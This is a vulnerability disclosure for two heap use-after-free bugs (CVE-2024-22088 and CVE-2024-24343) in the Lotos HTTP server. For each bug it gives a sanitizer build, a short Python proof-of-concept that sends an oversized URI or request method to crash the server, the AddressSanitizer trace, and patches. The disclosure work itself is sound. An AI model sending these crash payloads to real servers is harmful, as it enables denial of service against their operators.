# CVE-2024-22088

After executing my fuzz tests I discovered a remote use-after-free vulnerability the Lotos HTTP server through commit 3eb36cc in the function static inline size_t buffer_avail(const buffer_t *pb) at buffer.h, line 25:

```
static inline size_t buffer_avail(const buffer_t *pb) { return pb->free; } 
```

Any project that utilizes lotos (including the existing forks of this repo) are potentially vulnerable.  Depending on the implementation, this can lead to undefined behavior, denial of service, or authentication bypass. 

### Makefile Modifications

The following modifications were made to the Makefile to compile lotos with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the use-after-free vulnerability:

```
CFLAGS=-std=c99 -Wall -O3 -DNDEBUG -DUSE_MEM_POOL=1 -fsanitize=address -g
OPTFLAGS=

OBJS=misc.o ssstr.o dict.o lotos_epoll.o buffer.o request.o response.o \
 connection.o http_parser.o server.o mem_pool.o main.o

lotos : $(OBJS)
	$(CC) $(CFLAGS) $^ -o $@ $(OPTFLAGS)

test :
	make -C ./test
	make test -C ./test

format :
	find . -iname '*.[ch]' -exec clang-format -i -style="{ColumnLimit: 80}" {} +

clean :
	rm -f *.o lotos

.PHONY : test clean format
```

### Compiling Lotos

```
$ cd lotos/src/
$ make && make test
```

### Proof of Concept Python3 Script

Save the following script to a file named poc.py. The script will send an HTTP request with a malformed URI to lotos and wait for a response.  More specifically, the code will send an HTTP request with a URI containing 20,000 bytes:

```
#!/usr/bin/env python3

import socket


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8888))
sock.send(b"GET /"+b"?"*20000+b" HTTP/1.1\r\nHost:localhost:8001\r\n\r\n")
response = sock.recv(4096)
sock.close()
```

### Starting Lotos

```
./lotos -r ../www
```

### Executing our Python3 Script

```
# python3 poc.py
```

### Address Sanitizer Output

The following output was produced by address sanitizer: 

```
==415636==ERROR: AddressSanitizer: heap-use-after-free on address 0x625000002904 at pc 0x5585539a14ec bp 0x7ffc148a9370 sp 0x7ffc148a9368
READ of size 4 at 0x625000002904 thread T0                                                                                                                                      
    #0 0x5585539a14eb in buffer_avail /home/kali/projects/fuzzing/lotos/src/buffer.h:25
    #1 0x5585539a14eb in buffer_cat /home/kali/projects/fuzzing/lotos/src/buffer.c:44
    #2 0x5585539a1935 in request_recv /home/kali/projects/fuzzing/lotos/src/request.c:137
    #3 0x5585539a34f8 in request_handle /home/kali/projects/fuzzing/lotos/src/request.c:144
    #4 0x55855399fc4a in main /home/kali/projects/fuzzing/lotos/src/main.c:81
    #5 0x7fc8c68456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #6 0x7fc8c6845784 in __libc_start_main_impl ../csu/libc-start.c:360
    #7 0x55855399fe80 in _start (/home/kali/projects/fuzzing/lotos/src/lotos+0x6e80) (BuildId: f69cadb3b591a9b1911fbc4bf465035606fb00ae)

0x625000002904 is located 4 bytes inside of 8201-byte region [0x625000002900,0x625000004909)
freed by thread T0 here:                                                                                                                                                        
    #0 0x7fc8c6ad74b5 in __interceptor_realloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:85
    #1 0x5585539a13f1 in buffer_cat /home/kali/projects/fuzzing/lotos/src/buffer.c:60

previously allocated by thread T0 here:
    #0 0x7fc8c6ad85bf in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x5585539a11bd in buffer_new /home/kali/projects/fuzzing/lotos/src/buffer.c:10
    #2 0x5585539a11bd in buffer_init /home/kali/projects/fuzzing/lotos/src/buffer.c:7

SUMMARY: AddressSanitizer: heap-use-after-free /home/kali/projects/fuzzing/lotos/src/buffer.h:25 in buffer_avail
Shadow bytes around the buggy address:
  0x625000002680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x625000002700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x625000002780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x625000002800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x625000002880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x625000002900:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x625000002980: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x625000002a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x625000002a80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x625000002b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x625000002b80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==415636==ABORTING

```

The error occurs in the buffer_avail function, which is called from buffer_cat in the buffer.c file. The problematic access occurs after a call to realloc in buffer_cat: 

```
/* realloc */
size_t cur_len = buffer_len(pb);
size_t new_len = cur_len + nbyte;
/* realloc strategy */
if (new_len < BUFFER_LIMIT)
new_len *= 2;
else
new_len += BUFFER_LIMIT;

npb = realloc(pb, sizeof(buffer_t) + new_len + 1);
```

When realloc is called, it may move the memory block to a new location if the new size cannot be accommodated in the existing space. This means the pointer to the buffer (buffer_t *pb) could become invalid if realloc moves the memory.

After reallocating, any existing pointers to the old memory location become invalid. If you try to use the old pointer (pb) without updating it to the new memory location returned by realloc it leads to undefined behavior, which is what AddressSanitizer is catching.

### Mitigation

There are many moving pieces in this repo, but the following code added to request.c can mitigate this vulnerability.  Ultimately to maintain the current functionality and prevent the use-after-free vulnerability, a check is added to line 130 in request.c so all requests greater than 5000 bytes are dropped:

Old Code in request.c, line 130:
```
if (len == ERROR) {
```

Updated Code in request.c, line 130:
```
if (len == ERROR || len>5000) {

```

The length of 5000 can be modified to meet your specific needs.  Keep in mind, the use-after-free occurs at roughly 8154 bytes in the URI.  

### References

* https://cwe.mitre.org/data/definitions/416.html
* https://learn.snyk.io/lesson/use-after-free/
* https://owasp.org/www-community/vulnerabilities/Using_freed_memory#:~:text=Use%20after%20free%20errors%20occur,conditions%20and%20other%20exceptional%20circumstances
* https://www.cve.org/CVERecord?id=CVE-2024-22088

# CVE-2024-24343

I discovered a second remote use-after-free vulnerability in the Lotos HTTP server.  The use-after-free occurs in static inline char *buffer_end(const buffer_t *pb), line 32:

https://github.com/chendotjs/lotos/blob/3eb36cc3723a1dc9bb737505f0c8a3538ee16347/src/buffer.h#L31-L33

Any project that utilizes lotos (including the existing forks of this repo) are potentially vulnerable.  Depending on the implementation, this can lead to undefined behavior, denial of service, or authentication bypass. 

### Makefile Modifications

The following modifications were made to the Makefile to compile lotos with address sanitizer and debug symbols. The purpose of this is to track and verify the location of the use-after-free vulnerability:

```
CFLAGS=-std=c99 -Wall -O3 -DNDEBUG -DUSE_MEM_POOL=1 -fsanitize=address -g
OPTFLAGS=

OBJS=misc.o ssstr.o dict.o lotos_epoll.o buffer.o request.o response.o \
 connection.o http_parser.o server.o mem_pool.o main.o

lotos : $(OBJS)
	$(CC) $(CFLAGS) $^ -o $@ $(OPTFLAGS)

test :
	make -C ./test
	make test -C ./test

format :
	find . -iname '*.[ch]' -exec clang-format -i -style="{ColumnLimit: 80}" {} +

clean :
	rm -f *.o lotos

.PHONY : test clean format
```

### Compiling Lotos

```
$ cd lotos/src/
$ make && make test
```

### Proof of Concept Python3 Script

Save the following script to a file named poc.py. The script will send an packet with a malformed HTTP verb (request method) to lotos and wait for a response.  The verb is a series of '/.' characters.  The total size of the malformed method is around 10,000 bytes.  This can also be achieved with a malformed 'Host:' header:

```
#!/usr/bin/env python3
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8888))
sock.send(b"/."*5000+b" /hello HTTP/1.1\r\nHost: localhost:8888\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n\r\n\r\n")
response = sock.recv(4096)
sock.close()
```

### Starting Lotos

```
./lotos -r ../www
```

### Executing our Python3 Script

```
# python3 poc.py
```

### Address Sanitizer Output

The following output was produced by address sanitizer: 

```
==296123==ERROR: AddressSanitizer: heap-use-after-free on address 0x625000002900 at pc 0x56177a0dbbed bp 0x7fffd7927b10 sp 0x7fffd7927b08
READ of size 4 at 0x625000002900 thread T0
    #0 0x56177a0dbbec in buffer_end /home/kali/projects/fuzzing/lotos/src/buffer.h:32
    #1 0x56177a0dbbec in parse_request_line /home/kali/projects/fuzzing/lotos/src/http_parser.c:34
    #2 0x56177a0d7376 in request_handle_request_line /home/kali/projects/fuzzing/lotos/src/request.c:170
    #3 0x56177a0d8530 in request_handle /home/kali/projects/fuzzing/lotos/src/request.c:162
    #4 0x56177a0d4c4a in main /home/kali/projects/fuzzing/lotos/src/main.c:81
    #5 0x7f4c4fa456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #6 0x7f4c4fa45784 in __libc_start_main_impl ../csu/libc-start.c:360
    #7 0x56177a0d4e80 in _start (/home/kali/projects/fuzzing/lotos/src/lotos+0x6e80) (BuildId: f69cadb3b591a9b1911fbc4bf465035606fb00ae)

0x625000002900 is located 0 bytes inside of 8201-byte region [0x625000002900,0x625000004909)
freed by thread T0 here:
    #0 0x7f4c4fcd74b5 in __interceptor_realloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:85
    #1 0x56177a0d63f1 in buffer_cat /home/kali/projects/fuzzing/lotos/src/buffer.c:60

previously allocated by thread T0 here:
    #0 0x7f4c4fcd85bf in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:69
    #1 0x56177a0d61bd in buffer_new /home/kali/projects/fuzzing/lotos/src/buffer.c:10
    #2 0x56177a0d61bd in buffer_init /home/kali/projects/fuzzing/lotos/src/buffer.c:7

SUMMARY: AddressSanitizer: heap-use-after-free /home/kali/projects/fuzzing/lotos/src/buffer.h:32 in buffer_end
Shadow bytes around the buggy address:
  0x625000002680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x625000002700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x625000002780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x625000002800: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x625000002880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x625000002900:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x625000002980: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x625000002a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x625000002a80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x625000002b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x625000002b80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==296123==ABORTING

```

The error is a "heap-use-after-free" issue detected by AddressSanitizer in lotos. It occurs when the program attempts to read a 4-byte memory region at address 0x625000002900 after that memory has already been deallocated (freed). The error originates from the buffer_end function in buffer.h at line 32 and is part of a call stack involving multiple functions, ultimately leading to the main function. 

### Mitigation

The issue related to the buffer_end function, which is used to determine the end of the buffer. The way to mitigate this issues is to ensure that you do not access memory that has been previously freed. Similar to [issue 7](https://github.com/chendotjs/lotos/issues/7) when realloc is called, it may move the memory block to a new location if the new size cannot be accommodated in the existing space. This means the pointer to the buffer could become invalid if realloc moves the memory.  The following updates can mitigate this issue.  Modify the lengths for your specific use case:

1. Check the size of the HTTP verbs in static int parse_method at http_parser.c, line 342:

Old code:
```
static int parse_method(char *begin, char *end) {
  int len = end - begin;
```

Updated code with a length check:
```
static int parse_method(char *begin, char *end) {
  int len = end - begin;
  if(len > 7){
    return HTTP_INVALID;
  }
```


2. Check the size of the request in request.c, line 130:

Old code:

```
    if (len == ERROR ) {
      if (errno != EAGAIN) {
        lotos_log(LOG_ERR, "recv: %s", strerror(errno));
        return ERROR;
      } else
        return AGAIN; /* does not have data now */
    }
    buffer_cat(r->ib, buf, len); /* append new data to buffer */
```

Updated code:

```
    if (len == ERROR || len>2000) {
      if (errno != EAGAIN) {
        lotos_log(LOG_ERR, "recv: %s", strerror(errno));
        return ERROR;
      } else
        return AGAIN; /* does not have data now */
    }
    buffer_cat(r->ib, buf, len); /* append new data to buffer */
```


### References

* [CVE-2024-24343](https://www.cve.org/CVERecord?id=CVE-2024-24343)
* https://cwe.mitre.org/data/definitions/416.html
* https://learn.snyk.io/lesson/use-after-free/
* https://owasp.org/www-community/vulnerabilities/Using_freed_memory#:~:text=Use%20after%20free%20errors%20occur,conditions%20and%20other%20exceptional%20circumstances

  
